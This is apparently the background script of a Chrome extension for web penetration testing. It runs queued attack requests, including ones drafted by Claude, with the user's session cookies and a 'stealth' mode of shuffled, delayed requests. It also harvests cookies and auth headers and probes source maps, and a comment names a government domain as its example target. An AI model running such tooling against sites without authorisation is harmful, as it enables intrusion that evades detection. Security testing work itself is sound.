        // can pick the right view and Phase 2/3/4 can read their respective state.
        mode:d.mode||"classic",claudeQueue:d.claudeQueue||[],stackAttacks:d.stackAttacks||[],markedFixed:d.markedFixed||[],continuousMonitor:d.continuousMonitor||null
      });return true;}
    // v6.0 — Mode setter. Validates the mode against the canonical list, persists to the
    // tab state, and triggers a debounced session save so the choice survives SW restarts.
    // Invalid modes are rejected silently (the popup also validates client-side).
    case "setMode":{
      const VALID_MODES=["classic","red","blue"];
      if(!VALID_MODES.includes(msg.mode)){sendResponse({ok:false,error:"invalid mode"});return true;}
      const t=T(msg.tabId);
      t.mode=msg.mode;
      markDirty(msg.tabId);
      sendResponse({ok:true,mode:t.mode});
      return true;}
    // v6.0 — Claude queue persistence. The popup parses a fenced JSON block from the
    // clipboard, validates it, and pushes the cleaned `attacks` array here. Same handler
    // is used to clear the queue (queue=[]). Persisted via markDirty so a popup re-open
    // shows the same queue.
    case "setClaudeQueue":{
      const t=T(msg.tabId);
      t.claudeQueue=Array.isArray(msg.queue)?msg.queue.slice(0,40):[];// hard cap matches popup-side
      markDirty(msg.tabId);
      sendResponse({ok:true,count:t.claudeQueue.length});
      return true;}
    // v6.0 — Run queued Claude attacks. Each attack becomes one or more probe requests
    // executed in the page context with current custom headers + stealth. We reuse the
    // existing runProbe scaffolding by injecting a pre-built attack list and bypassing
    // the standard 36-step pipeline. Findings flow back into tab.probeData and are
    // re-correlated by analyzeExploitChains() on the next getData call.
    case "runClaudeQueue":{
      if(!_debugTabs.has(msg.tabId)){sendResponse({ok:false,error:"Deep mode required"});return true;}
      const t=T(msg.tabId);
      const queue=t.claudeQueue||[];
      if(!queue.length){sendResponse({ok:false,error:"empty queue"});return true;}
      runClaudeQueueAttacks(msg.tabId,queue,msg.customHeaders||{},msg.stealth===true).then(r=>{
        sendResponse({ok:true,results:r||[]});
      }).catch(e=>sendResponse({ok:false,error:e.message||String(e)}));
      return true;}
    // v6.0 — Mark a finding as fixed. Persists in tab.markedFixed. The popup recomputes
    // the health score immediately so the UI updates without a re-scan.
    case "markFixed":{
      const t=T(msg.tabId);
      if(!Array.isArray(t.markedFixed))t.markedFixed=[];
      const id=String(msg.findingId||"");
      if(id&&!t.markedFixed.find(f=>(f.id||f)===id)){
        t.markedFixed.push({id,markedAt:Date.now()});
        markDirty(msg.tabId);
      }
      sendResponse({ok:true,count:t.markedFixed.length});
      return true;}
    // v6.0 — Continuous monitor toggle. Uses chrome.alarms (5-minute interval, runs while
    // the SW is alive). On each tick we re-scan the page for new secrets vs the last
    // snapshot stored in tab.continuousMonitor.lastSnapshot. New secrets fire a
    // chrome.notifications notification (requires the "notifications" permission added
    // in manifest v6).
    case "toggleContinuousMonitor":{
      const t=T(msg.tabId);
      const enabled=!!msg.enabled;
      t.continuousMonitor={enabled,interval:300,lastSnapshot:t.continuousMonitor?.lastSnapshot||null,alerts:t.continuousMonitor?.alerts||[]};
      const alarmName=`ps:cm:${msg.tabId}`;
      if(enabled){
        chrome.alarms.create(alarmName,{delayInMinutes:5,periodInMinutes:5});
      }else{
        chrome.alarms.clear(alarmName);
      }
      markDirty(msg.tabId);
      sendResponse({ok:true,enabled});
      return true;}
    // v6.0 — Snapshot save. Captures current findings + chains under the host's bucket
    // in chrome.storage.local. FIFO eviction at 20 snapshots. Phase 5 builds on this.
    case "saveSnapshot":{
      saveSnapshot(msg.tabId).then(r=>sendResponse({ok:true,...r})).catch(e=>sendResponse({ok:false,error:e.message||String(e)}));
      return true;}
    // v6.0 — Diff snapshots. Compares the current scan against the most recent saved
    // snapshot for the same host. Returns {new[], resolved[], unchanged[]} keyed by
    // stable finding IDs. Used by Blue mode "Compare to last".
    case "diffSnapshots":{
      diffSnapshotsForTab(msg.tabId,msg.host).then(r=>sendResponse({ok:true,...r})).catch(e=>sendResponse({ok:false,error:e.message||String(e)}));
      return true;}
    // v6.1 — Workbench: get state bundle. Returns endpoints + auth contexts + repeater
    // history in one call so the workbench can refresh without 3 round-trips.
    case "wbGetState":{
      const t=T(msg.tabId);
      sendResponse({ok:true,
        data:{endpoints:t.endpoints||[],techStack:t.techStack||[],probeData:t.probeData||null,exploitChains:t.exploitChains||[]},
        auth:{active:t.authActive||"Anonymous",list:t.authContexts||[]},
        history:t.repeaterHistory||[],
      });
      return true;}
    // v6.1 — Workbench: send a request via page-context fetch. Merges active auth
    // context's cookies + headers, then runs in the source tab so credentials:'include'
    // picks up real session cookies (in addition to context-supplied ones).
    case "wbSendRequest":{
      const t=T(msg.tabId);
      const ctxName=msg.req.ctxName||t.authActive||"Anonymous";
      const ctx=(t.authContexts||[]).find(c=>c.name===ctxName)||{cookies:{},headers:{}};
      runWorkbenchRequest(msg.tabId,msg.req,ctx).then(r=>{
        sendResponse({ok:true,...r,ctxName});
      }).catch(e=>sendResponse({ok:false,error:e.message||String(e)}));
      return true;}
    // v6.1 — Workbench: push a repeater history entry. Cap 50 entries (newest first).
    case "wbHistoryPush":{
      const t=T(msg.tabId);
      if(!Array.isArray(t.repeaterHistory))t.repeaterHistory=[];
      t.repeaterHistory.unshift(msg.entry);
      if(t.repeaterHistory.length>50)t.repeaterHistory.length=50;
      markDirty(msg.tabId);
      sendResponse({ok:true,count:t.repeaterHistory.length});
      return true;}
    // v6.1 — Workbench: clear repeater history.
    case "wbHistoryClear":{
      const t=T(msg.tabId);
      t.repeaterHistory=[];
      markDirty(msg.tabId);
      sendResponse({ok:true});
      return true;}
    // v6.1 — Workbench: persist auth contexts (full bundle write). Force an immediate
    // flush — markDirty's 5-second debounce is too long for credentials the user just
    // typed; if the SW dies in those 5 seconds, the contexts are gone. flushDirty()
    // writes synchronously through chrome.storage.session before sendResponse fires.
    case "wbAuthSave":{
      const t=T(msg.tabId);
      if(msg.auth&&Array.isArray(msg.auth.list))t.authContexts=msg.auth.list;
      if(msg.auth&&typeof msg.auth.active==="string")t.authActive=msg.auth.active;
      _dirtyTabs.add(msg.tabId);
      flushDirty().then(()=>sendResponse({ok:true})).catch(e=>sendResponse({ok:false,error:e.message||String(e)}));
      return true;}
    // v6.1 — Workbench: open URL handler. Returns the workbench URL the popup uses.
    case "wbOpen":{
      const url=chrome.runtime.getURL("workbench.html")+"?source="+msg.tabId;
      chrome.tabs.create({url}).then(t=>sendResponse({ok:true,tabId:t.id})).catch(e=>sendResponse({ok:false,error:e.message||String(e)}));
      return true;}
    case "clearData":{const wasDeep=_debugTabs.has(msg.tabId);delete state[msg.tabId];if(_scripts[msg.tabId])_scripts[msg.tabId]=new Map();Object.keys(_seen).forEach(k=>{if(k.startsWith(`${msg.tabId}:`))delete _seen[k];});Object.keys(_pending).forEach(k=>{if(k.startsWith(`${msg.tabId}:`))delete _pending[k];});if(wasDeep)T(msg.tabId).deepEnabled=true;sendResponse({ok:true});return true;}
    case "reportContentScan":{const tabId=sender.tab?.id;if(tabId){const t=T(tabId);
      // Standard fields
      ["secrets","hiddenFields","forms","jsGlobals","storageData","links","inlineHandlers","metaTags","serviceWorkers","cspViolations","perfEntries"].forEach(k=>{if(msg[k])t[k]=msg[k];});
      // v4 new fields
      ["mixedContent","sriIssues","postMessageListeners","dependencyVersions","webWorkers","domXSSSinks","jsonpEndpoints","cookieFindings","reconSuggestions","pathParams"].forEach(k=>{if(msg[k])t[k]=msg[k];});
      // v5.4 fields
      if(msg.webAuthnInfo)t.webAuthnInfo=msg.webAuthnInfo;
      if(msg.coopCoepInfo&&!t.coopCoepInfo)t.coopCoepInfo=msg.coopCoepInfo;
      if(msg.webrtcLeaks&&msg.webrtcLeaks.length)msg.webrtcLeaks.forEach(l=>{if(!t.webrtcLeaks.find(x=>x.ip===l.ip))t.webrtcLeaks.push(l);});
      if(msg.wasmModules&&msg.wasmModules.length)msg.wasmModules.forEach(w=>{if(!t.wasmModules.find(x=>x.url===w.url))t.wasmModules.push(w);});
      if(msg.techStack)msg.techStack.forEach(x=>{if(!t.techStack.find(y=>y.name===x.name))t.techStack.push(x);});
      if(msg.sourceMaps)msg.sourceMaps.forEach(x=>{if(!t.sourceMaps.find(y=>y.mapUrl===x.mapUrl))t.sourceMaps.push(x);});
    }sendResponse({ok:true});return true;}
    case "runScan":{chrome.tabs.sendMessage(msg.tabId,{action:"scan"},r=>sendResponse(r||{ok:true}));return true;}
    // v6.1.1 — Update full-capture flag at runtime so the user's toggle takes effect
    // immediately without an extension reload.
    case "setFullCapture":{
      _fullCaptureEnabled=!!msg.enabled;
      sendResponse({ok:true,enabled:_fullCaptureEnabled});
      return true;}
    case "getCookies":{const t=T(msg.tabId);if(t.url){chrome.cookies.getAll({url:t.url},cookies=>{t.cookies=(cookies||[]).map(c=>({name:c.name,value:c.value.substring(0,200),domain:c.domain,path:c.path,secure:c.secure,httpOnly:c.httpOnly,sameSite:c.sameSite,expirationDate:c.expirationDate,session:c.session}));sendResponse(t.cookies);});}else sendResponse([]);return true;}
    case "reportRuntime":{sendResponse({ok:true});return true;}
    case "reportIntercept":{sendResponse({ok:true});return true;}
    case "reportEphemeral":{sendResponse({ok:true});return true;}
    case "scanRuntime":{runRuntimeExtraction(msg.tabId);collectEphemeralDOM(msg.tabId);extractAllScriptSources(msg.tabId);sendResponse({ok:true});return true;}
    case "enableDeep":{attachDebugger(msg.tabId).then(ok=>sendResponse({ok}));return true;}
    case "disableDeep":{detachDebugger(msg.tabId).then(()=>sendResponse({ok:true}));return true;}
    case "startProbe":{
      if(!_debugTabs.has(msg.tabId)){sendResponse({ok:false,error:"Deep mode required"});return true;}
      runProbe(msg.tabId,msg.aggroLevel||"medium",msg.customHeaders||{},msg.recursive!==false,msg.stealth===true).then(r=>{
        sendResponse({ok:r.status==="done",results:r,error:r.status==="error"?r.error:null});
      }).catch(e=>sendResponse({ok:false,error:e.message}));
      return true;}
    case "scanSourceMaps":{
      const tab=T(msg.tabId);
      
      // Get target domain from Chrome directly (state.url might be empty)
      chrome.tabs.get(msg.tabId,(chromeTab)=>{
      const tabUrl=chromeTab?.url||tab.url||"";
      let targetDomain="";
      try{targetDomain=new URL(tabUrl).hostname;}catch(e){console.warn('[PenScope] scanSourceMaps domain',e.message||e);}
      const targetBase=targetDomain.split(".").slice(-2).join(".");// e.g. "moe.gov.ae" → "gov.ae" — too short, use full
      
      // Third-party CDNs/libraries to skip — not the target's code
      const CDN_NOISE=["unpkg.com","cdnjs.cloudflare.com","cdn.jsdelivr.net","ajax.googleapis.com","code.jquery.com","stackpath.bootstrapcdn.com","maxcdn.bootstrapcdn.com","cdn.cognitive.microsoft.com","csspeechstorage.blob.core.windows.net","amp.azure.net","aka.ms","fonts.googleapis.com","fonts.gstatic.com","www.google-analytics.com","www.googletagmanager.com","connect.facebook.net","platform.twitter.com","cdn.segment.com","cdn.mxpnl.com","js.stripe.com","checkout.stripe.com","www.youtube.com","s.ytimg.com","player.vimeo.com","cdn.datatables.net","cdn.tiny.cloud","cdn.ckeditor.com","cdn.quilljs.com","d3js.org","cdn.plot.ly","cdn.chart.js","raw.githubusercontent.com","cdn.firebase.com","www.gstatic.com","apis.google.com","maps.googleapis.com","translate.googleapis.com","recaptcha.net","challenges.cloudflare.com","static.cloudflareinsights.com","cdn.lr-ingest.io","cdn.heapanalytics.com","cdn.amplitude.com","sentry.io","browser.sentry-cdn.com","js.intercomcdn.com","widget.intercom.io","snap.licdn.com","static.hotjar.com","cdn.mouseflow.com","cdn.optimizely.com","cdn.rudderlabs.com","cdn.branch.io","bat.bing.com","sc.lsrv.net"];

      function isTargetDomain(url){
        try{
          const host=new URL(url).hostname;
          // Same domain as target
          if(host===targetDomain)return true;
          // Subdomain of target (e.g. lms-asm.moe.gov.ae for moe.gov.ae)
          if(host.endsWith("."+targetDomain))return true;
          // Check if it's the same base org (e.g. both under moe.gov.ae)
          const hostParts=host.split(".");
          const targetParts=targetDomain.split(".");
          if(hostParts.length>=3&&targetParts.length>=3){
            const hostBase=hostParts.slice(-3).join(".");
            const tgtBase=targetParts.slice(-3).join(".");
            if(hostBase===tgtBase)return true;
          }
          return false;
        }catch{return false;}
      }

      function isCDN(url){
        try{const host=new URL(url).hostname;return CDN_NOISE.some(cdn=>host===cdn||host.endsWith("."+cdn));}catch{return true;}
      }

      // Step 1: Collect all possible .map URLs from state
      const mapUrls=new Set();
      (tab.sourceMaps||[]).forEach(sm=>{if(sm.mapUrl&&sm.mapUrl.startsWith("http")&&sm.mapUrl.endsWith(".map"))mapUrls.add(sm.mapUrl);});
      (tab.endpoints||[]).forEach(ep=>{
        if(ep.type==="script"&&ep.url&&ep.url.startsWith("http")){
          const clean=ep.url.split("?")[0];
          if(clean.endsWith(".js"))mapUrls.add(clean+".map");
        }
      });

      // Step 2: Find scripts on page
      chrome.scripting.executeScript({target:{tabId:msg.tabId},func:()=>{
        const urls=new Set();
        document.querySelectorAll("script[src]").forEach(s=>{
          if(s.src&&s.src.startsWith("http")){const clean=s.src.split("?")[0];if(clean.endsWith(".js"))urls.add(clean+".map");}
        });
        document.querySelectorAll("link[rel='stylesheet']").forEach(l=>{
          if(l.href&&l.href.startsWith("http")){const clean=l.href.split("?")[0];if(clean.endsWith(".css"))urls.add(clean+".map");}
        });
        document.querySelectorAll("script:not([src])").forEach(s=>{
          const m=(s.textContent||"").match(/\/\/[#@]\s*sourceMappingURL\s*=\s*(\S+)/);
          if(m&&m[1]&&!m[1].startsWith("data:")){try{urls.add(new URL(m[1],location.href).href);}catch{}}
        });
        return [...urls];
      }},(injResults)=>{
        if(!chrome.runtime.lastError&&injResults&&injResults[0]){
          (injResults[0].result||[]).forEach(u=>mapUrls.add(u));
        }

        // Step 3: Filter — only target domain, skip CDNs
        const filtered=[...mapUrls].filter(u=>isTargetDomain(u)&&!isCDN(u));
        const skipped=mapUrls.size-filtered.length;

        if(!filtered.length){
          // Fallback: if no target-domain maps, show all non-CDN maps
          const fallback=[...mapUrls].filter(u=>!isCDN(u));
          if(fallback.length){
            // Run scan on non-CDN URLs
            chrome.scripting.executeScript({target:{tabId:msg.tabId},func:(urls)=>{
              return Promise.all(urls.map(url=>{
                return fetch(url,{method:"HEAD",credentials:"same-origin"}).then(r=>{
                  return{url,status:r.status,ct:r.headers.get("content-type")||"",size:parseInt(r.headers.get("content-length")||"0")};
                }).catch(e=>({url,status:0,error:e.message}));
              }));
            },args:[fallback]},(fetchResults)=>{
              if(chrome.runtime.lastError||!fetchResults||!fetchResults[0]){sendResponse({ok:true,results:[],total:0,skipped,targetDomain});return;}
              const results=fetchResults[0].result||[];
              const found=results.filter(r=>r.status===200);
              sendResponse({ok:true,results,found:found.length,total:fallback.length,skipped:mapUrls.size-fallback.length,targetDomain});
            });
            return;
          }
          sendResponse({ok:true,results:[],total:0,skipped,targetDomain});return;
        }

        // Step 4: Fetch each from page context
        chrome.scripting.executeScript({target:{tabId:msg.tabId},func:(urls)=>{
          return Promise.all(urls.map(url=>{
            return fetch(url,{method:"HEAD",credentials:"same-origin"}).then(r=>{
              return{url,status:r.status,ct:r.headers.get("content-type")||"",size:parseInt(r.headers.get("content-length")||"0")};
            }).catch(e=>({url,status:0,error:e.message}));
          }));
        },args:[filtered]},(fetchResults)=>{
          if(chrome.runtime.lastError||!fetchResults||!fetchResults[0]){
            sendResponse({ok:false,error:"Failed to scan: "+(chrome.runtime.lastError?.message||"unknown")});return;
          }
          const results=fetchResults[0].result||[];
          const found=results.filter(r=>r.status===200);
          sendResponse({ok:true,results,found:found.length,total:filtered.length,skipped,targetDomain});
        });
      });
      });// close chrome.tabs.get
      return true;}
    // v5.8: HAR import — ingest a Burp/ZAP/DevTools capture and populate state as if the traffic
    // had been captured live. Useful for post-hoc analysis without opening the target, sharing
    // scans between team members, or replaying captures from tools that intercept better than
    // the browser's own fetch layer.
    case "importHar":{
      const t=T(msg.tabId);
      const entries=msg.entries||[];
      let imported=0,newEps=0,newParams=0,newAuth=0,newBodies=0,newFindings=0;
      entries.forEach(ent=>{
        try{
          const req=ent.request;const resp=ent.response;
          if(!req||!resp)return;
          const url=req.url||"";
          if(!url||!url.startsWith("http"))return;
          let u;try{u=new URL(url);}catch{return;}
          if(u.protocol==="chrome-extension:"||u.protocol==="data:")return;
          imported++;
          if(!t.url)t.url=url;
          const method=(req.method||"GET").toUpperCase();
          const path=u.pathname;
          const epKey=`${method}:${u.hostname}:${path}`;
          const tags=tagEndpoint(path);
          if(!seen(msg.tabId,"ep",epKey)){
            const ep={method,url,path,host:u.hostname,query:u.search,type:resp.content?.mimeType?.includes("html")?"main_frame":"xmlhttprequest",timestamp:Date.parse(ent.startedDateTime)||Date.now(),initiator:"har-import",tags,status:resp.status||null,responseSize:resp.content?.size||resp.bodySize||null};
            t.endpoints.push(ep);
            t.endpointIndex.set(url,ep);
            newEps++;
          }
          // Query params
          u.searchParams.forEach((val,key)=>{
            const pk=`q:${path}:${key}`;
            if(!t.params[pk]){t.params[pk]={path,param:key,example:val.substring(0,100),source:"query",method};newParams++;}
          });
          // Request headers — auth extraction
          if(req.headers){
            const authHdrs=[];
            req.headers.forEach(h=>{
              if(!h.name||!h.value)return;
              if(AUTH_HDRS.includes(h.name.toLowerCase()))authHdrs.push({name:h.name,value:h.value.substring(0,500)});
            });
            if(authHdrs.length){
              const hKey=authHdrs.map(h=>`${h.name}:${h.value.substring(0,20)}`).join("|");
              if(!seen(msg.tabId,"rqh",hKey)){t.requestHeaders.push({url,method,headers:authHdrs,timestamp:Date.now()});newAuth++;}
            }
          }
          // POST bodies
          if(req.postData&&req.postData.text&&["POST","PUT","PATCH","DELETE"].includes(method)){
            const body=req.postData.text.substring(0,CONFIG.MAX_POST_BODY);
            const pKey=`pb:${method}:${path}`;
            if(!seen(msg.tabId,"pb",pKey)&&t.postBodies.length<CONFIG.MAX_POST_BODIES){
              t.postBodies.push({method,url,path,contentType:req.postData.mimeType||"",body,timestamp:Date.now()});
              newBodies++;
              // JSON body param extraction
              try{
                if((req.postData.mimeType||"").includes("json")||body.charAt(0)==="{"||body.charAt(0)==="["){
                  const obj=JSON.parse(body);
                  const extract=(o,prefix="")=>{
                    if(typeof o!=="object"||!o)return;
                    for(const[k,v] of Object.entries(o)){
                      const pk=`jb:${path}:${prefix}${k}`;
                      if(!t.params[pk]){t.params[pk]={path,param:prefix?`${prefix}${k}`:k,example:String(v).substring(0,100),source:"json-body",method};newParams++;}
                    }
                  };
                  extract(obj);
                }
              }catch{}
            }
          }
          // Response body scanning — rich findings pipeline
          if(resp.content&&resp.content.text&&resp.content.size<500000){
            const body=resp.content.text;
            const meta={url,status:resp.status,mimeType:resp.content.mimeType||""};
            try{scanResponseBody(msg.tabId,meta,body.substring(0,50000));}catch(e){}
            // API response deep scan
            const isJSON=(resp.content.mimeType||"").includes("json");
            const isAPI=/\/api\//i.test(path);
            if((isJSON||isAPI)&&body.length>10){
              const rbKey=`arb:${path}`;
              if(!seen(msg.tabId,"arb",rbKey)&&t.apiResponseBodies.length<100){
                const findings=deepScanBody(body,url);
                if(findings.length)newFindings+=findings.length;
                t.apiResponseBodies.push({url,path,status:resp.status,size:body.length,contentType:resp.content.mimeType,bodyPreview:body.substring(0,500),findings,timestamp:Date.now()});
              }
            }
            // JS files — run endpoint + secret grep
            if((resp.content.mimeType||"").includes("javascript")||url.endsWith(".js")){
              try{scanScriptViaNetwork(msg.tabId,body,url);}catch(e){}
            }
          }
          // Response headers — detect auth/cookie/CSP issues
          if(resp.headers&&resp.status&&(resp.content?.mimeType||"").includes("html")){
            try{
              const hdrs={};const leaks=[];
              resp.headers.forEach(h=>{
                const n=h.name.toLowerCase();
                hdrs[n]=h.value;
                if(LEAK_HEADERS.includes(n))leaks.push({name:h.name,value:h.value});
              });
              const missing=[];
              for(const[header,info] of Object.entries(SEC_HEADERS))if(!hdrs[header])missing.push({header,severity:info.sev,desc:info.desc});
              let cspAnalysis=null;
              if(hdrs["content-security-policy"])cspAnalysis=analyzeCSP(hdrs["content-security-policy"]);
              const entry={url,type:"main_frame",missing,leaks,corsIssues:[],cookieIssues:[],cspAnalysis,raw:hdrs,timestamp:Date.now()};
              const idx=t.headers.findIndex(h=>h.type==="main_frame");
              if(idx<0)t.headers.push(entry);
            }catch(e){}
          }
        }catch(e){}
      });
      markDirty(msg.tabId);
      sendResponse({ok:true,imported,endpoints:newEps,params:newParams,authHeaders:newAuth,postBodies:newBodies,findings:newFindings});
      return true;}
    case "downloadSourceMap":{
      // Fetch a single .map file content from page context
      chrome.scripting.executeScript({target:{tabId:msg.tabId},func:(url)=>{
        return fetch(url,{credentials:"same-origin"}).then(r=>{
          if(!r.ok)return{ok:false,status:r.status};
          return r.text().then(body=>({ok:true,body,size:body.length,url}));
        }).catch(e=>({ok:false,error:e.message}));
      },args:[msg.url]},(res)=>{
        if(chrome.runtime.lastError||!res||!res[0]){
          sendResponse({ok:false,error:chrome.runtime.lastError?.message||"failed"});return;
        }
        const r2=res[0].result||{ok:false};
        // Auto-parse downloaded source map
        if(r2.ok&&r2.body&&r2.body.indexOf('"sources"')>-1){
          try{parseAndStoreSourceMap(msg.tabId,r2.body,msg.url,"scanner-download");}catch(e){console.warn('[PenScope] parse downloaded map',e);}
        }
        sendResponse(r2);
      });
      return true;}
  }
});

// -------------------------------------------------------
// v6.0: Page-context runner functions for chrome.scripting.executeScript
// -------------------------------------------------------
// These MUST be named function declarations (not new Function() or arrow expressions
// stored in let/const) because MV3 service workers ban dynamic code construction. The
// runner functions are stringified via toString() at injection time and re-evaluated
// in the page context — closure variables don't carry, so every value the runner needs
// comes through `args`. Keep these self-contained and side-effect-free.

async function __pageRunClaudeQueue(queue,customHeaders,stealth,baseUrl){
  const out=[];
  const headers=customHeaders||{};
  function shuf(a){if(!stealth)return a;for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
  function delay(ms){return new Promise(r=>setTimeout(r,ms));}
  const items=shuf((queue||[]).slice());
  for(const it of items){
    try{
      let url=it.url||it.endpoint||"";
      if(!url){out.push({attack:it,error:"no url/endpoint"});continue;}
      if(!/^https?:/i.test(url))url=baseUrl+(url.startsWith("/")?url:"/"+url);
      const method=(it.method||"GET").toUpperCase();
      const reqHeaders=Object.assign({},headers);
      if(it.headers)Object.assign(reqHeaders,it.headers);
      if(it.body&&!reqHeaders["Content-Type"]&&!reqHeaders["content-type"])reqHeaders["Content-Type"]="application/json";
      const init={method,credentials:"include",headers:reqHeaders};
      if(it.body&&method!=="GET"&&method!=="HEAD")init.body=it.body;
      const t0=performance.now();
      const r=await fetch(url,init);
      const dt=Math.round(performance.now()-t0);
      let body="";try{body=(await r.text()).substring(0,4000);}catch(e){}
      out.push({attack:it,status:r.status,size:body.length,bodyPreview:body.substring(0,800),timeMs:dt,url});
      if(stealth)await delay(40+Math.floor(Math.random()*180));
    }catch(e){out.push({attack:it,error:String(e&&e.message||e)});}
  }
  return out;
}

// v6.1 — Workbench request runner. Sends one request from the page context (so
// credentials:'include' picks up real session cookies + the user's auth-context
// cookies via document.cookie merge). Returns {status, headers{}, body, size, timeMs}.
async function runWorkbenchRequest(tabId,req,ctx){
  const headers=Object.assign({},ctx.headers||{},req.headers||{});
  // Merge auth context cookies into Cookie header. The browser will also append its
  // own cookies for the target origin via credentials:'include'; the manual merge
  // forces context-specific overrides (e.g. testing with User A's cookies on a tab
  // logged in as User B).
  const ctxCookies=ctx.cookies||{};
  if(Object.keys(ctxCookies).length){
    const cookieStr=Object.entries(ctxCookies).map(([k,v])=>`${k}=${v}`).join("; ");
    headers["Cookie"]=cookieStr;// note: most pages can't set Cookie via fetch; see runner for fallback
  }
  let results;
  try{
    const inj=await chrome.scripting.executeScript({
      target:{tabId},world:"MAIN",
      func:__pageRunOneRequest,
      args:[req.method||"GET",req.url||"",headers,req.body||"",ctxCookies],
    });
    if(inj&&inj[0]&&inj[0].result)results=inj[0].result;
  }catch(e){
    try{
      const inj2=await chrome.scripting.executeScript({
        target:{tabId},
        func:__pageRunOneRequest,
        args:[req.method||"GET",req.url||"",headers,req.body||"",ctxCookies],
      });
      if(inj2&&inj2[0]&&inj2[0].result)results=inj2[0].result;
    }catch(e2){throw e2;}
  }
  return results||{error:"no result"};
}

// Page-context single-request runner. Browsers forbid setting Cookie via fetch headers,
// so we fall back to writing context cookies into document.cookie before the request,
// then RESTORING the user's original cookies in a finally block — without restore, every
// Repeater send would persist the auth-context cookies into the user's actual browsing
// session on the target, potentially logging them in as the test user (privacy + safety
// hazard). HttpOnly cookies aren't visible/writable from JS, so they're never touched.
async function __pageRunOneRequest(method,url,headers,body,ctxCookies){
  // Snapshot the JS-visible cookies BEFORE we touch anything. This is the state we'll
  // restore the page to. HttpOnly cookies don't appear here (and can't be set from JS
  // either), so they're invisible to this whole flow.
  const originalCookies={};
  document.cookie.split(";").forEach(c=>{
    const [k,...rest]=c.trim().split("=");
    if(k&&k.length)originalCookies[k.trim()]=rest.join("=");
  });
  // Track which cookie names we wrote so we know what to undo. Distinguish "we
  // overwrote an existing cookie" from "we created a new one" so restore can either
  // put the original back or expire ours.
  const ourWrittenNames=[];
  if(ctxCookies&&typeof ctxCookies==="object"){
    Object.entries(ctxCookies).forEach(([k,v])=>{
      if(!k)return;
      try{
        document.cookie=`${k}=${v}; path=/`;
        ourWrittenNames.push(k);
      }catch(e){/* setting blocked (e.g. opaque-origin) — silently skip */}
    });
  }
  // Strip Cookie header — browsers reject this via fetch() anyway, but defensive.
  const reqHeaders=Object.assign({},headers||{});
  delete reqHeaders["Cookie"];
  delete reqHeaders["cookie"];
  const init={method:method.toUpperCase(),credentials:"include",headers:reqHeaders};
  if(body&&init.method!=="GET"&&init.method!=="HEAD")init.body=body;
  const t0=performance.now();
  let result;
  try{
    const r=await fetch(url,init);
    const dt=Math.round(performance.now()-t0);
    let respText="";
    try{respText=await r.text();}catch(e){respText="(body read error: "+String(e.message||e)+")";}
    const respHeaders={};
    r.headers.forEach((v,k)=>{respHeaders[k]=v;});
    result={status:r.status,headers:respHeaders,body:respText.substring(0,50000),size:respText.length,timeMs:dt};
  }catch(e){
    result={error:String(e&&e.message||e),timeMs:Math.round(performance.now()-t0)};
  }finally{
    // CRITICAL: restore the page's original cookie state. Walk every name we wrote:
    //   - if the name existed before, set it back to its original value
    //   - if we created a new name, expire it (RFC 6265 — past expiration deletes)
    // We can't perfectly preserve flags (HttpOnly was never visible; Secure flows from
    // the page's origin scheme) — but we restore the visible value, which is what
    // matters for the user's session continuity.
    ourWrittenNames.forEach(k=>{
      try{
        if(k in originalCookies){
          document.cookie=`${k}=${originalCookies[k]}; path=/`;
        }else{
          document.cookie=`${k}=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
        }
      }catch(e){/* best effort */}
    });
  }
  return result;
}

async function __pageRunStackAttacks(items,headers,stealth,baseUrl,symbolHints){
  const out=[];
  function shuf(a){if(!stealth)return a;for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
  function delay(ms){return new Promise(r=>setTimeout(r,ms));}
  const runOrder=shuf((items||[]).slice());
  for(const it of runOrder){
    try{
      const url=baseUrl+(it.path&&it.path.startsWith("/")?it.path:"/"+(it.path||""));
      const reqHeaders=Object.assign({},headers||{});
      const init={method:(it.method||"GET").toUpperCase(),credentials:"include",headers:reqHeaders};
      let body=it.body;
      // Custom branches that need symbol-table hints (graphql field fuzz)
      if(it.custom==="use-symbol-table-as-field-dict"&&symbolHints&&symbolHints.length){
        const fields=symbolHints.slice(0,12).map(n=>n+'{__typename}').join(' ');
        body={query:'{ '+fields+' }'};
      }
      if(body!==undefined){
        if(typeof body==="object"){init.body=JSON.stringify(body);if(!reqHeaders["Content-Type"])reqHeaders["Content-Type"]="application/json";}
        else init.body=String(body);
      }
      const t0=performance.now();
      const r=await fetch(url,init);
      const dt=Math.round(performance.now()-t0);
      let txt="";try{txt=(await r.text()).substring(0,8000);}catch(e){}
      let confirmed=false;
      if(it.expect&&it.expect.length){confirmed=it.expect.some(e=>txt.indexOf(e)>=0);}
      else if(r.status>=200&&r.status<400&&txt.length>30){confirmed=true;}
      out.push({family:it.family,step:it.step,url,method:it.method||"GET",status:r.status,timeMs:dt,confirmed,severity:confirmed?(it.severity||"medium"):"info",evidence:txt.substring(0,300)});
      if(stealth)await delay(40+Math.floor(Math.random()*180));
    }catch(e){out.push({family:it.family,step:it.step,error:String(e&&e.message||e),severity:"info"});}
  }
  return out;
}

